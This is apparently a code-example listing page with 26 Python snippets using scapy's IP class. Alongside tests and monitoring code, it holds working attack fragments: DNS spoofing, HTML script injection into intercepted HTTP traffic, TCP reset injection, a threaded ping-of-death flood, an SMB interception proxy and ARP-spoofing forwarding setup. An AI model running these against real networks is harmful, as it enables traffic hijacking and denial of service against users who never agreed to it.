示例1: rawhandle
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def rawhandle(pkt):
    if sniff_pkts:
        scapy.wrpcap(random_filename+"arpy.pcap",pkt)
        counter = 0
        while counter < 1:
            counter += 1
            layer = pkt.getlayer(counter)
            if layer.haslayer(scapy.Raw) and layer.haslayer(scapy.IP):
                print(bcolours.OKBLUE + '\n[Info] Found the following (' + layer.name + ' layer): ' + layer.src + " -> " + layer.dst + bcolours.ENDC)
                tcpdata = layer.getlayer(scapy.Raw).load
                if not opts.verbose:
                    print tcpdata
                else:
                    print layer.show()
            else:
                break 
开发者ID:ivanvza，项目名称:arpy，代码行数:18，代码来源:arpy.py



 
示例2: pkt_callback
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def pkt_callback(self, pkt):
        """
        Proccess DNS packets
        """
        if self.ccname in pkt[DNS].qd.qname:
            if pkt[DNS].qd.qname == '666.' + self.ccname + '.':
                print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime())
                      + 'DNS/PDNS:' + pkt[IP].src + ':ALARM Case Open!')
            else:
                text = decrypt(pkt[DNS].qd.qname.split('.')[0])
                text = text.strip()
                hexip = text.split(',')[-1]
                text = text.replace(hexip, hextoip(hexip))
                if pkt[DNS].qd.qtype == 2:
                    text = 'DNS:' + pkt[IP].src + ':' + text
                else:
                    text = 'PDNS:' + pkt[IP].src + ':' + text
                printer(self.filed, text) 
开发者ID:ekiojp，项目名称:circo，代码行数:20，代码来源:carpa.py


示例3: checkhost
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def checkhost(server, works, session, ipadd, natip):
    """
    Check if host exist in Faraday
    """
    resp = session.get(server + '/_api/v2/ws/' + works + '/hosts/')
    if resp.status_code == 200:
        hostdata = resp.json()
        for hostrow in range(len(hostdata['rows'])):
            if ipadd == hostdata['rows'][hostrow]['value']['ip']:
                return int(hostdata['rows'][hostrow]['value']['id'])
        HOST['ip'] = ipadd
        HOST['description'] = 'NAT IP: ' + natip
        resp = session.post(server + '/_api/v2/ws/' + works + '/hosts/', json=HOST)
        if resp.status_code == 201:
            hostdata = resp.json()
            return hostdata['id']
        else:
            print('ERROR: API Host insert fail')
            print(resp.text)
            print(repr(HOST))
    else:
        print('ERROR: API Hosts call fail')
        print(resp.text)
    return None 
开发者ID:ekiojp，项目名称:circo，代码行数:26，代码来源:carpa.py



 
示例4: callback
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def callback(self, packet):
        flags = packet.sprintf("%TCP.flags%")
        proto = IP
        if IPv6 in packet:
            proto = IPv6
        if flags == "A" and not self.ignore_packet(packet, proto):
            src_mac = packet[Ether].src
            dst_mac = packet[Ether].dst
            src_ip = packet[proto].src
            dst_ip = packet[proto].dst
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport
            seq = packet[TCP].seq
            ack = packet[TCP].ack
            if self.verbose:
                print("RST from %s:%s (%s) --> %s:%s (%s) w/ %s" % (src_ip, src_port, src_mac, dst_ip, dst_port, dst_mac, ack))
            if self.noisy:
                self.send(self.build_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq, proto))
            self.send(self.build_packet(dst_mac, src_mac, dst_ip, src_ip, dst_port, src_port, ack, proto)) 
开发者ID:ecthros，项目名称:pina-colada，代码行数:21，代码来源:tcpkiller.py


示例5: test_single_udp_packet
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def test_single_udp_packet():

    packets = [
        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
        / IP(src="127.0.0.1", dst="192.168.1.1")
        / UDP(sport=80, dport=5355)
    ]

    events = list(packets_to_datasource_events(packets).events())
    assert len(events) == 1

    assert events[0]["src_mac"] == "ab:ab:ab:ab:ab:ab"
    assert events[0]["dst_mac"] == "12:12:12:12:12:12"
    assert events[0]["src_ip"] == "127.0.0.1"
    assert events[0]["dst_ip"] == "192.168.1.1"
    assert events[0]["sport"] == 80
    assert events[0]["dport"] == 5355
    assert events[0]["event_type"] == "UDP" 
开发者ID:yampelo，项目名称:beagle，代码行数:20，代码来源:test_pcap.py



 
示例6: test_single_tcp_packet
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def test_single_tcp_packet():

    packets = [
        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
        / IP(src="127.0.0.1", dst="192.168.1.1")
        / TCP(sport=80, dport=5355)
    ]

    events = list(packets_to_datasource_events(packets).events())
    assert len(events) == 1

    assert events[0]["src_mac"] == "ab:ab:ab:ab:ab:ab"
    assert events[0]["dst_mac"] == "12:12:12:12:12:12"
    assert events[0]["src_ip"] == "127.0.0.1"
    assert events[0]["dst_ip"] == "192.168.1.1"
    assert events[0]["sport"] == 80
    assert events[0]["dport"] == 5355
    assert events[0]["event_type"] == "TCP" 
开发者ID:yampelo，项目名称:beagle，代码行数:20，代码来源:test_pcap.py


示例7: test_single_dns_resp_packet
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def test_single_dns_resp_packet():

    packets = [
        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
        / IP(src="127.0.0.1", dst="192.168.1.1")
        / UDP(sport=80, dport=53)
        / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"), an=DNSRR(rdata="123.0.0.1"))
    ]

    events = list(packets_to_datasource_events(packets).events())
    assert len(events) == 1

    assert events[0]["src_mac"] == "ab:ab:ab:ab:ab:ab"
    assert events[0]["dst_mac"] == "12:12:12:12:12:12"
    assert events[0]["src_ip"] == "127.0.0.1"
    assert events[0]["dst_ip"] == "192.168.1.1"
    assert events[0]["sport"] == 80
    assert events[0]["dport"] == 53
    assert events[0]["qname"] == "google.com."
    assert events[0]["qanswer"] == "123.0.0.1"
    assert events[0]["qtype"] == "A"
    assert events[0]["event_type"] == "DNS" 
开发者ID:yampelo，项目名称:beagle，代码行数:24，代码来源:test_pcap.py


示例8: test_single_dns_query_packet
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def test_single_dns_query_packet():

    packets = [
        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
        / IP(src="127.0.0.1", dst="192.168.1.1")
        / UDP(sport=80, dport=53)
        / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"))
    ]

    events = list(packets_to_datasource_events(packets).events())
    assert len(events) == 1

    assert events[0]["src_mac"] == "ab:ab:ab:ab:ab:ab"
    assert events[0]["dst_mac"] == "12:12:12:12:12:12"
    assert events[0]["src_ip"] == "127.0.0.1"
    assert events[0]["dst_ip"] == "192.168.1.1"
    assert events[0]["sport"] == 80
    assert events[0]["dport"] == 53
    assert events[0]["qname"] == "google.com."
    assert events[0]["qtype"] == "A"

    assert events[0]["event_type"] == "DNS" 
开发者ID:yampelo，项目名称:beagle，代码行数:24，代码来源:test_pcap.py


示例9: test_multiple_packets
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def test_multiple_packets():
    packets = [
        # HTTP Packet
        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
        / IP(src="127.0.0.1", dst="192.168.1.1")
        / TCP(sport=12345, dport=80)
        / HTTP()
        / HTTPRequest(Method="GET", Path="/foo", Host="https://google.com"),
        # DNS Packet
        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
        / IP(src="127.0.0.1", dst="192.168.1.1")
        / UDP(sport=80, dport=53)
        / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"), an=DNSRR(rdata="123.0.0.1")),
        # TCP Packet
        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
        / IP(src="127.0.0.1", dst="192.168.1.1")
        / TCP(sport=80, dport=5355),
    ]

    events = list(packets_to_datasource_events(packets).events())
    assert len(events) == 3

    assert [e["event_type"] for e in events] == ["HTTPRequest", "DNS", "TCP"] 
开发者ID:yampelo，项目名称:beagle，代码行数:25，代码来源:test_pcap.py


示例10: nfqueueHandler
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def nfqueueHandler(self, packet):
        pkt 	= IP(packet.get_payload()) 			#Converts the raw packet to a scapy object
        target 	= pkt.dst
        victim 	= pkt.src
        nc 		= Connection(pkt.src, pkt.dst, pkt[self.protocol].sport, pkt[self.protocol].dport, self.protocol, self.interface) 
        key 	= hash(str(nc.getMark()))
        self.connectionManager[key] = nc

        # Mark the packet so nfqueue won't touch it on the next iteration
        packet.set_mark(self.nfqueueNum)
        # Now that we've recoreded and marked the packet,
        # let's have the kernel present the packet to us again as if it were new. 
        # This time NFqueue won't touch it, and it will be passed to the intercept servers
        packet.repeat()
        return

    # This gets seperated off into a thread, it runs nfqueue
    # which is the most critical part. Without it, the proxy
    # cannot be transparent 
开发者ID:quickbreach，项目名称:SMBetray，代码行数:21，代码来源:ebcLib.py


示例11: _process_syn_scan
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def _process_syn_scan(self, pkt):
        """
        Receives SYN scan response from devices.

        """
        src_mac = pkt[sc.Ether].src
        device_id = utils.get_device_id(src_mac, self._host_state)
        device_port = pkt[sc.TCP].sport

        with self._host_state.lock:
            port_list = self._host_state.pending_syn_scan_dict.setdefault(device_id, [])
            if device_port not in port_list:
                port_list.append(device_port)
                utils.log('[SYN Scan Debug] Device {} ({}): Port {}'.format(
                    pkt[sc.IP].src, device_id, device_port
                )) 
开发者ID:noise-lab，项目名称:iot-inspector-client，代码行数:18，代码来源:packet_processor.py


示例12: get_server_hello
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def get_server_hello(pkt, layer, host_state):

    if pkt[sc.IP].src in host_state.get_ip_mac_dict_copy():
        device_ip = pkt[sc.IP].src
        remote_ip = pkt[sc.IP].dst
        device_port = pkt[sc.TCP].sport
        remote_port = pkt[sc.TCP].dport
    else:
        device_ip = pkt[sc.IP].dst
        remote_ip = pkt[sc.IP].src
        device_port = pkt[sc.TCP].dport
        remote_port = pkt[sc.TCP].sport

    return {
        'type': 'server_hello',
        'version': getattr(layer, 'version', None),
        'cipher_suite': getattr(layer, 'cipher_suite', None),
        'device_ip': device_ip,
        'device_port': device_port,
        'remote_ip': remote_ip,
        'remote_port': remote_port,
        'client_ts': time.time()
    } 
开发者ID:noise-lab，项目名称:iot-inspector-client，代码行数:25，代码来源:packet_processor.py


示例13: spoof_packet
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def spoof_packet(packet):
    options = get_arguments()
    dns_packet = scapy.IP(packet.get_payload())
    if dns_packet.haslayer(scapy.DNSRR):
        qname = dns_packet[scapy.DNSQR].qname
        if options.website in qname:
            dns_responce = scapy.DNSRR(rrname=qname, rdata=options.ip)
            dns_packet[scapy.DNS].an = dns_responce
            dns_packet[scapy.DNS].ancount = 1

            del dns_packet[scapy.IP].len
            del dns_packet[scapy.IP].chksum
            del dns_packet[scapy.UDP].len
            del dns_packet[scapy.UDP].chksum

            packet.set_payload(str(dns_packet))
    packet.accept() 
开发者ID:mpostument，项目名称:hacking_tools，代码行数:19，代码来源:dns_spoof.py


示例14: inject_code
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def inject_code(packet):
    http_packet = scapy.IP(packet.get_payload())
    if http_packet.haslayer(scapy.Raw):
        load = http_packet[scapy.Raw].load
        if http_packet[scapy.TCP].dport == 10000:
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
        elif http_packet[scapy.TCP].sport == 10000:
            injection_code = """<script>alert('Hello from devopslife.xyz');
                                </script>"""
            load = load.replace("</body>", injection_code + "</body>")
            length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if length_search and "text/html" in load:
                length = length_search.group(1)
                new_length = int(length) + len(injection_code)
                load = load.replace(length, str(new_length))

        if load != http_packet[scapy.Raw].load:
            new_packet = change_payload(http_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept() 
开发者ID:mpostument，项目名称:hacking_tools，代码行数:23，代码来源:code_injector.py


示例15: build_dhcp
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def build_dhcp(pdiscover):
    req_addr = None
    server_id = None
    vendor_class = None
    try:
        for m in pdiscover[DHCP].options:
            n, v = m
            if n == "requested_addr":
                req_addr = v
            elif n == "server_id":
                server_id = v
            elif n == "vendor_class_id":
                vendor_class = v
    except:
        pass
    print "[i] --> received vendor_class = %s" % vendor_class
    e_dst = pdiscover[Ether].src

    p = Ether(dst=e_dst) / IP(src=server_id, dst=req_addr or "0.0.0.0") / UDP(sport=67, dport=68, len=9000)
    p[UDP].chksum = get_udp_checksum(p)
    return p 
开发者ID:tintinweb，项目名称:pub，代码行数:23，代码来源:poc.py


示例16: __init__
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def __init__(self, ipv4):
        """Initialises the thread.

        Args:
            ipv4 (namedtuple): Contains various information about the IPv4 configuration.
            ipv4.gateway (str): The gateway's IP address.
            ipv4.network (netaddr.IPNetwork): The network IP address.
            ipv4.mac (str): MAC address of this device.
            ipv4.ip (str): IP address of this device.

        """
        threading.Thread.__init__(self)
        self.gateway = ipv4.gateway
        self.network = str(ipv4.network.network)
        self.mac = ipv4.mac
        self.ip = ipv4.ip 
开发者ID:usableprivacy，项目名称:upribox，代码行数:18，代码来源:misc_thread.py


示例17: run
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def run(self):
        """Sends IGMP general query packets using the multicast address 224.0.0.1.
        Received replies are processed by a SniffThread.
        """

        # create IGMP general query packet
        ether_part = Ether(src=self.mac)
        ip_part = IP(ttl=self._TTL, src=self.ip, dst=self._IGMP_MULTICAST)
        igmp_part = IGMP(type=self._IGMP_GENERAL_QUERY)

        # Called to explicitely fixup associated IP and Ethernet headers
        igmp_part.igmpize(ether=ether_part, ip=ip_part)

        while True:
            sendp(ether_part / ip_part / igmp_part)
            time.sleep(self._SLEEP) 
开发者ID:usableprivacy，项目名称:upribox，代码行数:18，代码来源:misc_thread.py


示例18: test_reflector_sniffer_pos
​ 点赞 6 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def test_reflector_sniffer_pos(self):

        args = ["8.8.8.8", "-I", "0"]
        options = amplifier_parse_args(args)
        sniffer = ReflectorSniffer(options)

        packet = IP() / UDP()
        result = sniffer.filter_action(packet)
        self.assertMultiLineEqual(
            result,
            "TARGET: 8.8.8.8 | TO TARGET packets: 0, bytes: 0 | FROM "
            "TARGET packets: 0, bytes: 0 | AMPLIF FACTOR: 0.00%",
        )

        packet = IP(src="1.1.1.1", dst="8.8.8.8") / UDP(dport=1000, sport=2000)
        result = sniffer.filter_action(packet)
        self.assertIn("-100.00%", result)
        self.assertIn(" 28 ", result)

        packet = IP(src="8.8.8.8", dst="1.1.1.1") / UDP(dport=1000, sport=2000)
        result = sniffer.filter_action(packet)
        self.assertIn(" 28 ", result)
        self.assertIn(" 0.00%", result) 
开发者ID:Samsung，项目名称:cotopaxi，代码行数:25，代码来源:test_amplifier_detector.py


示例19: POD_ATTACK
​ 点赞 5 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def POD_ATTACK(threads, attack_time, target):
    # Finish
    global FINISH
    FINISH = False

    target_ip = target

    print("\033[1;34m"+"[*]"+"\033[0m"+" Starting POD attack...")
    
    threads_list = []

    # POD flood
    def pod_flood():
        global FINISH
        payload = random.choice(list("1234567890qwertyuiopasdfghjklzxcvbnm")) * 60000
        packet  = IP(dst = target_ip) / ICMP(id = 65535, seq = 65535) / payload

        while not FINISH:
            for i in range(16):
                send(packet, verbose = False)
                print("\033[1;32m"+"[+]"+"\033[0m"+" Packet was sent!")

    # Start threads
    for thread in range(0, threads):
        print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
        t = Thread(target = pod_flood)
        t.start()
        threads_list.append(t)
    # Sleep selected secounds
    time.sleep(attack_time)
    # Terminate threads
    for thread in threads_list:
        FINISH = True
        thread.join()
    
    print("\033[1;77m"+"[i]"+"\033[0m"+" Attack completed.") 
开发者ID:entynetproject，项目名称:quack，代码行数:38，代码来源:pod.py


示例20: setup_ipv_forwarding
​ 点赞 5 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def setup_ipv_forwarding():
    if not dns_sniff_gource:
        print(bcolours.OKBLUE + '[Info] Enabling IP Forwarding...' + bcolours.ENDC)
    os.system('sysctl -w net.inet.ip.forwarding=1 > /dev/null')
    os.system('sudo sysctl -w net.inet.ip.forwarding=1 > /dev/null ') 
开发者ID:ivanvza，项目名称:arpy，代码行数:7，代码来源:arpy.py


示例21: exit_handler
​ 点赞 5 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def exit_handler():
    if not dns_sniff_gource:
        print(bcolours.OKBLUE + '[Info] Disabling IP Forwarding...' + bcolours.ENDC)
    os.system('sysctl -w net.inet.ip.forwarding=0 > /dev/null')
    os.system('sudo sysctl -w net.inet.ip.forwarding=0 > /dev/null ')
    print(bcolours.OKBLUE + '[Info] Application Ended Gracefully.' + bcolours.ENDC) 
开发者ID:ivanvza，项目名称:arpy，代码行数:8，代码来源:arpy.py


示例22: dnshandle
​ 点赞 5 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def dnshandle(pkt):
    if dns_sniff_gource:
        sys.stdout = open(random_filename+'parsed_nmap', 'a')
        FQDN = pkt.getlayer(scapy.DNS).qd.qname
        domain = FQDN.split('.')
        print str(time.time())[:-3] + "|" + target + "|A|" + str(domain[1]) + '/' + str(FQDN)
    else:
        if pkt.haslayer(scapy.DNS):
            print(bcolours.OKBLUE + pkt.getlayer(scapy.IP).src + '\t' + pkt.getlayer(scapy.IP).dst + '\t' + bcolours.WARNING + pkt.getlayer(scapy.DNS).qd.qname + bcolours.ENDC) 
开发者ID:ivanvza，项目名称:arpy，代码行数:11，代码来源:arpy.py


示例23: get_local_ip
​ 点赞 5 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def get_local_ip():
    """from https://stackoverflow.com/a/28950776/5133167
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(("10.255.255.255", 1))
        IP = s.getsockname()[0]
    except:
        IP = "127.0.0.1"
    finally:
        s.close()
    return IP 
开发者ID:louisabraham，项目名称:LaBot，代码行数:15，代码来源:network.py


示例24: from_client
​ 点赞 5 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def from_client(pa):
    logger.debug("Determining packet origin...")
    dst = pa.getlayer(IP).dst
    src = pa.getlayer(IP).src
    if src == LOCAL_IP:
        logger.debug("Packet comes from local machine")
        return True
    elif dst == LOCAL_IP:
        logger.debug("Packet comes from server")
        return False
    logger.error(
        "Packet origin unknown\nsrc: %s\ndst: %s\nLOCAL_IP: %s", src, dst, LOCAL_IP
    )
    assert False, "Packet origin unknown" 
开发者ID:louisabraham，项目名称:LaBot，代码行数:16，代码来源:network.py


示例25: printInital
​ 点赞 5 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def printInital(moduleName, client_iface, client_ip):
   print ("\033[33m[!] Client Interface: {}\033[0m".format(str(client_iface)))
   print ("\033[33m[!] Client IP: {}\033[0m".format(str(client_ip)))
   print ("\033[94m[!] {} process started. \033[0m".format(moduleName)) 
开发者ID:meliht，项目名称:Mr.SIP，代码行数:6，代码来源:mr.sip.py


示例26: printResult
​ 点赞 5 ​
# 需要导入模块: from scapy import all [as 别名]
# 或者: from scapy.all import IP [as 别名]
def printResult(result,target):
   user_agent = ""
   for key, value in result["response"]['headers'].iteritems():
      if key == "user-agent":              
         user_agent = list(value)[0]

   if utilities.defineTargetType(user_agent) == "Server":
      print ("\033[1;32m[+] New live IP found on {}, It seems as a SIP Server ({}).\033[0m".format(target, user_agent))
      utilities.writeFile(options.ip_list, target + ";" + user_agent + ";SIP Server" + "\n")
      removeDuplicateLines(options.ip_list)
   else:
      print ("\033[1;32m[+] New live IP found on " + target + ", It seems as a SIP Client.\033[0m")
      utilities.writeFile(options.ip_list, target + ";" + user_agent + ";SIP Server" + "\n")
      removeDuplicateLines(options.ip_list) 
开发者ID:meliht，项目名称:Mr.SIP，代码行数:16，代码来源:mr.sip.py